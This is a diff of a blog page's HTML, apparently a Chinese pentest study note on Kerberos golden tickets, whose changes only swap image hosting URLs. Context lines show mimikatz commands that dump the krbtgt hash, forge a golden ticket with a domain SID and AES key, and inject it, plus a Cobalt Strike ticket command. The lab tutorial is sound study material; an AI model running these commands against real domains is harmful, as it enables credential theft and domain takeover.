@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109271559013.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271559013.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -510,7 +510,7 @@ lsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-n
 <pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109271559013.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271559013.png"></p>
 <p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p>
 <pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -525,7 +525,7 @@ lsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-n
 <pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109271628454.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271628454.png"></p>
 <blockquote>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a></p>
@@ -533,7 +533,7 @@ lsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-n
 <p><a target="_blank" rel="noopener" href="https://teamssix.com/210927-163036.html">https://teamssix.com/210927-163036.html</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -685,7 +685,7 @@ lsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-n
                 <a href="/211009-145524.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png" class="responsive-img" alt="【内网学习笔记】29、白银票据">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png" class="responsive-img" alt="【内网学习笔记】29、白银票据">
                         
                         <span class="card-title">【内网学习笔记】29、白银票据</span>
                     </div>
@@ -741,7 +741,7 @@ lsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-n
                 <a href="/210924-100520.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109231733653.png" class="responsive-img" alt="【内网学习笔记】27、Kerberos 域用户提权漏洞">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png" class="responsive-img" alt="【内网学习笔记】27、Kerberos 域用户提权漏洞">
                         
                         <span class="card-title">【内网学习笔记】27、Kerberos 域用户提权漏洞</span>
                     </div>
